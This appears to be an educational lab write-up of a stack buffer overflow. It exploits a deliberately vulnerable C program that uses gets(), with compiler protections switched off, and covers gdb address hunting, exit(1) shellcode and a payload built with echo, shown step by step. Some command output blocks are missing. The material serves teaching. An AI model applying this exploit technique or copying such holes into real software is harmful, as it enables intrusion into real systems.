## 0. AWTA for Exploiting a Bug?

Imagine you get a tiny coffee cup at a café, but instead of stopping at the top, you keep pouring—spilling coffee everywhere, even onto someone’s laptop. That’s how buffer overflow works in a program!

Our vulnerable C program (vuln.c) asks for your name but doesn’t check the size. By overflowing the small buffer (8 bytes), we can overwrite memory and change how the program runs—like sneaking a new script into a magic show.

Instead of letting the program run forever, we’ll inject a special input to hijack execution and make it exit with a return code of 1.

### Our "Mischievous" Plan:

1. Compile with weak security
2. Find memory targets using GDB
3. Rewrite the return address to force an exit.
4. Trigger the exit instead of running forever

Boom—program hijacked! Just like spilling coffee in just the right spot to shut down a laptop. ☕💥

## 1. Compiling the Vulnerable Program

Create a source code file **vuln.c**. This program reads user input into a buffer of 8 bytes using the `gets()` function, which does not check input size, making it vulnerable to buffer overflow. The `gets()` function is dangerous because not only does it not limit input size, it also overwrites adjacent memory—including the saved return address that determines where execution continues when user inputs more than 8 bytes. In short, it allows a user to input more data than the buffer can hold.

```c
#include <stdio.h>
void vuln() {
   char buffer[8]; //a small buffer (only 8bytes)
   gets(buffer);  // unsafe as it doesnt limit input size
} 
int main() { 
   vuln();  //calls the function containing the vulnerability
   while (1) { }  //keeps the program running indefinitely
}
```

To compile this program, we need to compile it in a way that removes security mechanisms to make exploitation easier.

```sh
gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
```

So what do these flags do?

* **-m32**: Compile for 32-bit architecture.
* **-fno-stack-protector**: Disable stack protection (no canary values).
* **-mpreferred-stack-boundary=2**: Forces a 4-byte aligned stack.
* **-fno-pie**: No position-independent executable (PIE).
* **-ggdb**: Includes debugging symbols.
* **-z execstack**: Allows execution of code on the stack.

Since we are not using Linux, we installed WSL and ran the command: `sudo apt install gcc`. However, upon attempting to compile the vuln.c, we encountered a fatal error:


This happened because multilib support, which allows compiling for 32-bit architecture, is missing from the WSL installation. To resolve this, we installed the required dependencies.

## 2. Finding Addresses

To take advantage of the buffer overflow, we need to know where the program stores its memory. We ran the program inside a debugger (gdb) using:

```sh
donna@Donna ~/CyberSec ❯ gdb vuln
```

Inside gdb, we set a breakpoint at the `gets(buffer);` line:

```sh
(gdb) break 1
```

This tells gdb to stop execution at a specific line so we can examine memory. We then run the program:

```sh
(gdb) run
```

It stops execution at line 5 (`gets(buffer);`). To know where we will inject our malicious input, we check where the “buffer” is stored in memory:

```sh
(gdb) print &buffer
```

The output gives the starting address of our buffer (e.g., `0xffffd028`).

Next, we check the registers to focus on the instruction pointer (eip), which controls program execution:

```sh
(gdb) info registers
```

Our goal is to overwrite the saved return address, which we locate by inspecting the stack frame:

```sh
(gdb) info frame
```

The output shows that the saved return address is stored at an address (e.g., `0xffffd034`), and that’s where our shellcode will be injected.

## 3. Obtaining Machine Code

To control how the program behaves after the overflow, we inject our own machine instructions (assembly code). We created an assembly file **asm.c** containing shellcode to exit the program cleanly.

Original **asm.c**:

```c
int main() {
    __asm__("xor %eax, %eax;"
    "inc %eax;"
    "mov %ebx, %eax;"
    "leave;"
    "ret;"
    );
}
```

After compiling it using:

```sh
gcc -m32 -fno-stack-protector -fno-pie -std=c99 -masm=intel asm.c -o asm
```

We then used the **objdump** tool to extract the machine code:

```sh
objdump -d asm > asmdump
```

The output from **asmdump** is as follows:

Original asmdump:

```sh
0000118d <main>:
    118d:	55                   	push   %ebp
    118e:	89 e5                	mov    %esp,%ebp
    1190:	31 c0                	xor    %eax,%eax
    1192:	40                   	inc    %eax
    1193:	89 c3                	mov    %eax,%ebx
    1195:	c9                   	leave
    1196:	c3                   	ret
    1197:	b8 00 00 00 00       	mov    $0x0,%eax
    119c:	5d                   	pop    %ebp
    119d:	c3                   	ret
```

Before writing shellcode, we modify the assembly code to trigger a system call (`int 0x80`), which forces program termination. Our modified **asm.c** becomes:

Modified **asm.c**:

```c
int main() {
    __asm__("xor %eax, %eax;"
    "inc %eax;"
    "mov %ebx, %eax;"
    "int 0x80;" 
    ); //calls the system interrupt to exit
}
```

Explanation of the instructions:

* `xor %eax, %eax;` sets EAX to 0.
* `inc %eax;` increments EAX by 1. In Linux 32-bit, the system call number for `exit()` is 1.
* `mov %ebx, %eax;` moves the value of EAX (which is 1) into EBX (the exit status).
* `int 0x80;` triggers a system call to exit.

Compile the assembly code and extract the machine code again:

```sh
gcc -m32 -fno-stack-protector -fno-pie -std=c99 -masm=intel asm.c -o asm
objdump -d asm > asmdump
```

The modified **asmdump** shows:

```sh
0000118d <main>:
    118d:	55                   	push   %ebp
    118e:	89 e5                	mov    %esp,%ebp
    1190:	31 c0                	xor    %eax,%eax
    1192:	40                   	inc    %eax
    1193:	89 c3                	mov    %eax,%ebx
    1195:	cd 80                	int    $0x80
    1197:	b8 00 00 00 00       	mov    $0x0,%eax
    119c:	5d                   	pop    %ebp
    119d:	c3                   	ret 
```

The critical machine code instructions for our shellcode are:

* `31 c0` → `xor    %eax,%eax`
* `40` → `inc    %eax`
* `89 c3` → `mov    %eax,%ebx`
* `cd 80` → `int    $0x80`

The final shellcode in hex is:

```sh
"\x31\xc0\x40\x89\xc3\xcd\x80"
```

## 4. Writing Down the Shellcode

Shellcode is a sequence of machine instructions designed to be injected into a vulnerable program. We generate our shellcode and save it in a file named **egg**.

Generate the shellcode:

```sh
echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x41\x41\x41\x41\x41\x28\xd0\xff\xff" > egg
```

This hex-encoded sequence corresponds to our modified assembly instructions, which exit the program cleanly.

Constructing the Payload:

* `\x41\x41\x41\x41...` → Padding (filling the buffer) which represents ASCII ‘A’
* `\x28\xd0\xff\xff` → Overwrite EIP with buffer address `0xffffd028`
* `\x31\xc0\x40\x89\xc3\xcd\x80` → Shellcode to exit

Once our shellcode is prepared, we inject and execute it inside gdb to confirm that it works correctly.

Start gdb with the vulnerable executable:

Within gdb, feed the shellcode stored in **egg** to the program:


The shellcode injected via the **egg** file overwrites the return address in memory, redirecting execution to our injected instructions, which execute the `int 0x80` system call to exit. The program terminates with an exit status of `01`, confirming that we have successfully hijacked execution using a buffer overflow exploit.

By understanding memory layouts, using debugging tools, and tweaking return addresses, we successfully hijacked execution. So, AW(e)TA for exploiting a bug? On one hand, yes—we intentionally took advantage of a flaw. But on the other hand, this is **how we find and fix vulnerabilities before real hackers do**. If a simple buffer overflow can let me—us take control, imagine what a malicious attacker could do.
